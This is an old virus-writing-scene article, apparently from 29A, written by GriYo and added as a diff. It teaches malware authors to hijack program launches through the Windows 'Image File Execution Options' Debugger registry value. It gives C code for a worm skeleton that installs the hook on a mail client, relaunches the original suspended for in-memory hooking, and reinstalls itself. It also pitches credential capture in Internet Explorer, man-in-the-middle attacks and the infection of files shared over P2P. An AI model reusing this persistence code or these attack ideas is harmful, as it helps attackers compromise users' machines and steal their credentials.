@@ -1,0 +1,293 @@
+=============================================================
+Execution redirection thru ‘Image File Execution Options’ key
+By GriYo/29A
+=============================================================
+
+I’m bored of worms and other malware which still use the well know,
+old fashioned, overexploited HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\
+\Windows\CurrentVersion\Run registry key.
+
+Here I’m going to underline one that may result in lots of fun if
+exploited with imagination.
+
+There is a registry key, ‘Image File Execution Options’, which will
+allow you to redirect execution of other executable file on the
+system. Although this is a well known and documented key, I don’t
+remember about any malware exploiting it, at least with enough
+imagination to catch my attention.
+
+Hands on work, go to the key HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\
+\Windows NT\CurrentVersion\Image File Execution Options and create a
+new key inside using the name of the executable you want to trick,
+lets say NOTEPAD.EXE.
+
+Notice that there are already some entries at ‘Image File Execution
+Options’ key. Those applications and stuff may be something related
+to compatibility of older WINDOWS applications or so...
+
+Now add a new string value to NOTEPAD.EXE key, call it ‘Debugger’,
+and enter the path of some other executable as its value. The whole
+thing will look like:
+
+Image File Execution Options
+|
+|__NOTEPAD.EXE
+     Debugger - REG_SZ - C:\WINDOWS\SYSTEM32\CALC.EXE
+
+Once done, go and click on NOTEPAD icon… And there is, CALC.EXE is
+executed instead. Funny enough to laugh when you sister tries to
+execute MICROSOFT MESSENGER, getting CALC.EXE instead... But we’ll
+try to go beyond that...
+
+Here is a simple command line application, TEST.C, which shows the
+parameters that were used to execute it:
+
+----------------------------------------------------------------------
+#include "stdio.h"
+#include "conio.h"
+
+int main( int argc, char **argv)
+{
+        int count ;
+
+        printf( "Number of arguments: %d\n", argc) ;
+
+        count = 0 ;
+
+        while( count < argc)
+        {
+                printf( "Argument %d: %s\n", count, argv[ count]) ;
+                count++ ;
+        }
+
+        while( !kbhit()) ;
+
+        return 0 ;
+}
+----------------------------------------------------------------------
+
+Compile it and place test.exe in your root folder, C:\TEST.EXE. Now
+go to NOTEPAD.EXE in the registry and change the value of ‘Debugger’
+to point to C:\TEST.EXE.
+
+Click on NOTEPAD icon and see the results displayed by TEST.EXE:
+
+----------------------------------------------------------------------
+Number of arguments: 2
+Argument 0: c:\test.exe
+Argument 1: C:\WINDOWS\system32\notepad.exe
+----------------------------------------------------------------------
+
+As you can see, the original application’s path is passed to test.exe
+as a parameter. Now create a README.TXT file on your root and click
+on it. If NOTEPAD.EXE is your default application for .txt files
+test.exe will appear, showing the following information:
+
+----------------------------------------------------------------------
+Number of arguments: 3
+Argument 0: c:\test.exe
+Argument 1: C:\WINDOWS\system32\NOTEPAD.EXE
+Argument 2: C:\readme.txt
+----------------------------------------------------------------------
+
+Now you can see the parameters passed to NOTEPAD.EXE also appear as
+parameters for test.exe.
+
+At this time we know we can write an application which can be
+executed instead of NOTEPAD.EXE. That application can take argv[ 1]
+and execute it, passing argv[ 2] or above as parameters. In such
+case, if your application doesn’t show any window the user won’t
+notice it.
+
+What can be done? You application will be executed instead of the
+original one. Upon execution you application may execute the original
+one, using the specified parameters, and eventually hooking some API
+or making certain changes.
+
+A problem you will face while doing this: You application (test.exe
+in this example) wont be able to execute the original
+one (NOTEPAD.EXE).
+
+Why? Because the redirection at ‘Image File Execution Options’ key.
+When TEST.EXE tries to execute NOTEPAD.EXE by means of CreateProcess,
+another instance of TEST.EXE will be executed instead, causing and
+endless loop.
+
+You will need to remove NOTEPAD.EXE key on ‘Image File Execution
+Options’, execute the original NOTEPAD.EXE file and then writing
+NOTEPAD.EXE key again.
+
+There are also some other minor problems you will have to face by
+yourself. Consider the following, uncompleted code, as an starting
+point:
+
+----------------------------------------------------------------------
+#include <windows.h>
+
+#define WormName "myworm"
+#define SubKey "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\msimn.exe"
+#define SIZEOF_SPOOF_CMDLINE 1024
+
+#ifdef _DEBUG
+void DbgOut( char *Text)
+{
+        MessageBox( NULL, Text, WormName, 0) ;
+}
+#endif
+
+BOOL SetImgHook()
+{
+        char WormPath[ MAX_PATH] ;
+
+        int Size ;
+        HKEY hKey ;
+        BOOL RetVal ;
+
+        Size = GetModuleFileName( NULL, WormPath, MAX_PATH) ;
+
+        RetVal = FALSE ;
+
+        if( RegCreateKey(       HKEY_LOCAL_MACHINE,
+                                SubKey,
+                                &hKey) == ERROR_SUCCESS)
+        {
+                RetVal = ( RegSetValueEx(       hKey,
+                                                "Debugger",
+                                                0,
+                                                REG_SZ,
+                                                WormPath,
+                                                Size) == ERROR_SUCCESS) ;
+
+                RegCloseKey( hKey) ;
+        }
+
+        return RetVal ;
+}
+
+BOOL ClearImgHook()
+{
+        return( RegDeleteKey(   KEY_LOCAL_MACHINE,
+                                SubKey) == ERROR_SUCCESS) ;
+}
+
+int WinMain(    HINSTANCE hInstance,
+                HINSTANCE hPrevInstance,
+                LPSTR lpCmdLine,
+                int nCmdShow)
+{
+        STARTUPINFO si ;
+        PROCESS_INFORMATION pi ;
+
+        char SpoofCmdLine[ SIZEOF_SPOOF_CMDLINE] ;
+        char *Src ;
+        char *Dst ;
+
+        #ifdef _DEBUG
+        if( ClearImgHook()) DbgOut( "App hook removed") ;
+        else DbgOut( "Error! Cant remove app hook") ;
+        #else
+        ClearImgHook() ;
+        #endif
+
+        GetStartupInfo( &si) ;
+
+        Src = lpCmdLine ;
+        Dst = SpoofCmdLine ;
+
+        while( *Src != '\0')
+        {
+                if( *Src != '\"')
+                {
+                        *Dst = *Src ;
+                        Dst++ ;
+                }
+
+                Src++ ;
+        }
+
+        *Dst = '\0' ;
+
+        if( CreateProcess(      SpoofCmdLine,
+                                NULL,
+                                NULL,
+                                NULL,
+                                FALSE,
+                                REATE_NEW_PROCESS_GROUP|CREATE_SUSPENDED,
+                                NULL,
+                                NULL,
+                                &si,
+                                &pi))
+        {
+                #ifdef _DEBUG
+                DbgOut( "Original app executed successfully") ;
+                #endif
+
+                //
+                // Place hooks over original executable now
+                //
+
+                ResumeThread( pi.hThread) ;
+                WaitForSingleObject( pi.hProcess, INFINITE) ;
+
+                #ifdef _DEBUG
+                DbgOut( "Original app closed") ;
+                #endif
+        }
+        #ifdef _DEBUG
+        else
+        {
+                DbgOut( "Error! Unable to execute original app") ;
+        }
+        #endif
+
+        #ifdef _DEBUG
+        if( SetImgHook()) DbgOut( "App hook reinstalled") ;
+        else DbgOut( "Error! Cant reinstall app hook") ;
+        #else
+        SetImgHook() ;
+        #endif
+
+        return 0 ;
+}
+----------------------------------------------------------------------
+
+What I’d like of this is:
+
+* Well, I don’t have to use the same fucking registry key every worm
+out there is already using!
+
+* Having a chance to modify / hook the original program in memory
+when it is executed without having to worry about WINDOWS FILE
+PROTECTION.
+
+Finally, decide which application you want to play with. Some
+ideas are:
+
+* INTERNET EXPLORER
+
+By placing on-memory hooks on IEXPLORE.EXE or its DLL’s you’ll be
+able to catch authentications, visited URL’s or make any kind of
+man-in-the-middle attack you can invent.
+
+* MAIL CLIENT
+
+Well, nothing to say here… Imagine by yourself, but please, don’t
+write stupid mass mailing shit just able to infect idiots who execute
+everything they receive. If you create something, create something
+new which demonstrates more than WINDOWS users stupidity.
+
+* WINDOWS EXPLORER
+
+Your application can gain complete access to everything done by
+EXPLORER.EXE, be creative.
+
+* P2P
+
+Mmmm… Let’s figure out the following scenario: Your application
+takes control instead of some P2P one, place hooks on it and launches
+the original. When a remote user request some file, you application
+adds something to that file, passes it to the P2P application for
+delivering and then restores the file to its original form.
+
+Thats all, have fun with coding and be creative! ;-)
+
